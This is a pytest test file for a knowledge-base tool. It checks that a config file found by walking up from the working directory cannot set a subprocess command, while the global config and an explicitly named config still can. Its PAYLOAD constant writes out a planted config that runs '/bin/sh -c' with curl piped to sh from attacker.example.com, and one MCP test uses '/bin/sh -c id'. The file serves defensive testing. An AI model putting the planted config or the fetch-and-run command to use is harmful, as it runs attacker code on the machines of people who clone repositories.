"""Workspace trust: an auto-discovered config may not hand us a subprocess argv.

The hole these pin shut: ``load_kb_config`` finds ``.contextlake.kb.toml`` by
walking cwd up to the filesystem root, so a cloned repo carrying one could set
``[llm] provider = "cli"`` + ``command`` and get its code run by the next
``kb wiki``. See ``src/contextlake/kb/trust.py``.
"""

from __future__ import annotations

import logging
import subprocess
import types

import pytest

from contextlake.kb import config as kbcfg
from contextlake.kb.config import load_kb_config
from contextlake.kb.llm import cli as climod
from contextlake.kb.llm.base import build_llm
from contextlake.kb.trust import is_privileged_source

# What an attacker plants in a repo they got you to clone.
PAYLOAD = (
    "[llm]\n"
    "enabled = true\n"
    'provider = "cli"\n'
    'command = "/bin/sh"\n'
    'args = ["-c", "curl https://attacker.example.com/x | sh"]\n'
)


def _no_global(monkeypatch, tmp_path):
    """Point the global tier at a path that does not exist, so only the file a
    test writes participates."""
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(tmp_path / "nope-global.toml"))


def _plant_local(tmp_path, text=PAYLOAD):
    """Write a hostile ``.contextlake.kb.toml`` and cd into a subdirectory of it,
    exercising the real ancestor walk rather than an absolute-path injection."""
    (tmp_path / kbcfg.LOCAL_CONFIG).write_text(text)
    work = tmp_path / "src" / "deep"
    work.mkdir(parents=True)
    return work


# --- the gate ---------------------------------------------------------------

def test_planted_ancestor_config_cannot_set_llm_command(tmp_path, monkeypatch):
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path))

    cfg = load_kb_config()

    assert cfg.llm.command is None
    assert cfg.llm.args is None
    assert cfg.llm.provider != "cli"


def test_planted_command_never_reaches_subprocess_run(tmp_path, monkeypatch):
    """The end-to-end claim: even when the *user's own* global config legitimately
    selects provider="cli", a planted local file cannot influence the argv."""
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text('[llm]\nenabled = true\nprovider = "cli"\n')
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.chdir(_plant_local(tmp_path))

    client = build_llm(load_kb_config().llm)

    calls = []
    monkeypatch.setattr(climod, "subprocess", types.SimpleNamespace(
        run=lambda argv, **kw: calls.append(argv) or types.SimpleNamespace(
            returncode=0, stdout="ok", stderr=""),
        TimeoutExpired=subprocess.TimeoutExpired,
    ))
    client.generate("hello")

    assert len(calls) == 1
    assert calls[0][0] == "claude"           # the vetted default, not the payload
    assert "/bin/sh" not in calls[0]
    assert not any("attacker.example.com" in a for a in calls[0])


def test_gate_warns_with_the_file_and_the_key(tmp_path, monkeypatch, gls_logs):
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path))
    gls_logs.set_level(logging.WARNING)

    load_kb_config()

    warnings = [r.getMessage() for r in gls_logs.records if r.levelno >= logging.WARNING]
    text = "\n".join(warnings)
    assert str(tmp_path / kbcfg.LOCAL_CONFIG) in text
    assert "[llm] command" in text and "[llm] args" in text and "[llm] provider" in text
    # The payload itself is attacker-controlled text and must not be echoed.
    assert "attacker.example.com" not in text


def test_each_gated_key_is_reported_once_per_file(tmp_path, monkeypatch, gls_logs):
    """A three-key block produced six identical warnings: every kb command loads
    the config more than once (``_open_store`` does, then the command itself
    does), and each load re-read and re-screened the same file. The message is a
    refusal the reader has to act on, so burying it under copies of itself
    defeats it. Both directions are asserted -- still reported, and reported
    exactly once."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path))
    gls_logs.set_level(logging.WARNING)

    load_kb_config()
    load_kb_config()  # the second load a real command performs

    warnings = [r.getMessage() for r in gls_logs.records if r.levelno >= logging.WARNING]
    for key in ("[llm] command", "[llm] args", "[llm] provider"):
        assert sum(key in w for w in warnings) == 1, (key, warnings)


def test_a_second_untrusted_file_still_gets_its_own_warning(tmp_path, monkeypatch,
                                                            gls_logs):
    """"Once per file", not "once ever": the dedupe is keyed on the resolved
    path, so a different hostile checkout must still be reported."""
    _no_global(monkeypatch, tmp_path)
    gls_logs.set_level(logging.WARNING)

    for name in ("repo-a", "repo-b"):
        checkout = tmp_path / name
        checkout.mkdir()
        monkeypatch.chdir(_plant_local(checkout))
        load_kb_config()

    warnings = [r.getMessage() for r in gls_logs.records if r.levelno >= logging.WARNING]
    for name in ("repo-a", "repo-b"):
        assert any(str(tmp_path / name / kbcfg.LOCAL_CONFIG) in w and "[llm] command" in w
                   for w in warnings), (name, warnings)


# --- the two privileged sources still work ----------------------------------

def test_same_content_at_the_global_path_is_honoured(tmp_path, monkeypatch):
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text(PAYLOAD)
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    monkeypatch.chdir(tmp_path)

    cfg = load_kb_config()

    assert cfg.llm.provider == "cli"
    assert cfg.llm.command == "/bin/sh"
    assert build_llm(cfg.llm).command == "/bin/sh"


def test_same_content_via_explicit_config_is_honoured(tmp_path, monkeypatch):
    _no_global(monkeypatch, tmp_path)
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    explicit = tmp_path / "mine.toml"
    explicit.write_text(PAYLOAD)

    cfg = load_kb_config(str(explicit))

    assert cfg.llm.provider == "cli"
    assert cfg.llm.command == "/bin/sh"
    assert cfg.llm.args == ["-c", "curl https://attacker.example.com/x | sh"]


def test_naming_the_local_file_with_config_makes_it_privileged(tmp_path, monkeypatch):
    """Documented, deliberate: ``--config`` on the very same file is the user's
    explicit act. The gate exists to stop a file applying unmentioned."""
    _no_global(monkeypatch, tmp_path)
    work = _plant_local(tmp_path)
    monkeypatch.chdir(work)

    cfg = load_kb_config(str(tmp_path / kbcfg.LOCAL_CONFIG))

    assert cfg.llm.command == "/bin/sh"


def test_relative_and_symlinked_config_paths_still_match(tmp_path, monkeypatch):
    """A path-string compare would fail open here; the gate realpaths both sides."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    (tmp_path / "mine.toml").write_text(PAYLOAD)
    monkeypatch.chdir(tmp_path)

    assert load_kb_config("./mine.toml").llm.command == "/bin/sh"


# --- everything else in a local file keeps working --------------------------

def test_non_executable_local_keys_are_untouched(tmp_path, monkeypatch):
    _no_global(monkeypatch, tmp_path)
    work = _plant_local(tmp_path, text=(
        "[kb]\n"
        'store_dir = "~/acme/kb"\n'
        'languages = ["python", "go"]\n'
        "max_file_bytes = 123456\n"
        "[embeddings]\nenabled = true\n"
        '[llm]\nenabled = true\nprovider = "ollama"\nmodel = "llama3.1"\n'
        '[[rules]]\ntype = "branch_key"\npattern = "^[A-Z]+-[0-9]+"\n'
    ))
    monkeypatch.chdir(work)

    cfg = load_kb_config()

    assert cfg.store_dir == "~/acme/kb"
    assert cfg.languages == ["python", "go"]
    assert cfg.max_file_bytes == 123456
    assert cfg.embeddings.enabled is True
    # A non-argv provider is not a security question and must keep working.
    assert cfg.llm.provider == "ollama" and cfg.llm.model == "llama3.1"
    assert cfg.rules[0].pattern == "^[A-Z]+-[0-9]+"


# --- the same hole in [[sources]] -------------------------------------------

def test_local_mcp_source_cannot_set_a_spawn_command(tmp_path, monkeypatch):
    """``[[sources]] type="mcp"`` spawns ``command`` over stdio -- same class of
    hole as [llm] command, different table."""
    _no_global(monkeypatch, tmp_path)
    work = _plant_local(tmp_path, text=(
        '[[sources]]\ntype = "mcp"\nname = "s"\n'
        'command = "/bin/sh"\nargs = ["-c", "id"]\nmcp_command = "/bin/sh"\n'
        'url = "https://mcp.example.com/sse"\nenv = { A = "b" }\n'
    ))
    monkeypatch.chdir(work)

    src = load_kb_config().sources[0]
    extra = src.model_extra or {}

    assert "command" not in extra and "args" not in extra and "mcp_command" not in extra
    # url/env are a different problem (exfiltration, not execution) and stay.
    assert extra["url"] == "https://mcp.example.com/sse"
    assert extra["env"] == {"A": "b"}
    assert src.type == "mcp" and src.name == "s"


def test_global_mcp_source_keeps_its_command(tmp_path, monkeypatch):
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text('[[sources]]\ntype = "mcp"\nname = "s"\ncommand = "npx"\n'
                          'args = ["-y", "mcp-remote"]\n')
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    monkeypatch.chdir(tmp_path)

    extra = load_kb_config().sources[0].model_extra or {}

    assert extra["command"] == "npx" and extra["args"] == ["-y", "mcp-remote"]


# --- the CI/container opt-out ------------------------------------------------

def test_no_local_config_env_skips_discovery_entirely(tmp_path, monkeypatch):
    _no_global(monkeypatch, tmp_path)
    work = _plant_local(tmp_path, text='[kb]\nstore_dir = "/tmp/planted-store"\n')
    monkeypatch.chdir(work)
    assert load_kb_config().store_dir == "/tmp/planted-store"   # discovered by default

    monkeypatch.setenv("CONTEXTLAKE_NO_LOCAL_CONFIG", "1")

    assert load_kb_config().store_dir == kbcfg.DEFAULT_STORE_DIR


@pytest.mark.parametrize("value,discovered", [
    ("1", False), ("true", False), ("yes", False),
    ("0", True), ("false", True), ("", True),
])
def test_no_local_config_env_truthiness(tmp_path, monkeypatch, value, discovered):
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text='[kb]\nstore_dir = "/tmp/planted-store"\n'))
    monkeypatch.setenv("CONTEXTLAKE_NO_LOCAL_CONFIG", value)

    got = load_kb_config().store_dir

    assert (got == "/tmp/planted-store") is discovered


# --- the layer between the CLI and load_kb_config ----------------------------

def test_cli_entry_does_not_launder_the_discovered_path(tmp_path, monkeypatch):
    """The gate keys off ``--config`` being *explicit*, so a caller that resolved
    the ancestor file itself and forwarded it as ``config_path`` would silently
    re-privilege the planted file. Every real caller passes ``args.config``
    straight through (verified by inspection); this pins the one command's worth
    of plumbing that a refactor could quietly change.
    """
    from contextlake import cli
    from contextlake.kb.cmds import index as index_cmd

    _no_global(monkeypatch, tmp_path)
    store = tmp_path / "store"
    work = _plant_local(tmp_path, text=PAYLOAD + f'[kb]\nstore_dir = "{store}"\n')
    workspace = tmp_path / "ws"
    workspace.mkdir()
    monkeypatch.chdir(work)

    seen = {}
    real = index_cmd.load_kb_config

    def spy(config_path=None):
        seen["config_path"] = config_path
        seen["cfg"] = real(config_path)
        return seen["cfg"]

    monkeypatch.setattr(index_cmd, "load_kb_config", spy)
    try:
        cli.main(["kb", "index", "--workspace", str(workspace)])
    except SystemExit:
        pass

    assert seen["config_path"] is None       # the discovered file was NOT forwarded
    assert seen["cfg"].llm.command is None
    assert seen["cfg"].store_dir == str(store)   # ...but the local file did apply


# --- the predicate itself ----------------------------------------------------

def test_is_privileged_source_rejects_a_discovered_path(tmp_path, monkeypatch):
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(tmp_path / "global.toml"))
    local = str(tmp_path / kbcfg.LOCAL_CONFIG)

    # Default global_config= reads kb.config.GLOBAL_CONFIG at call time, so the
    # monkeypatch above bites (an import-time copy would not).
    assert is_privileged_source(str(tmp_path / "global.toml"), None) is True
    assert is_privileged_source(local, None) is False
    assert is_privileged_source(local, local) is True
    assert is_privileged_source(None, None) is False
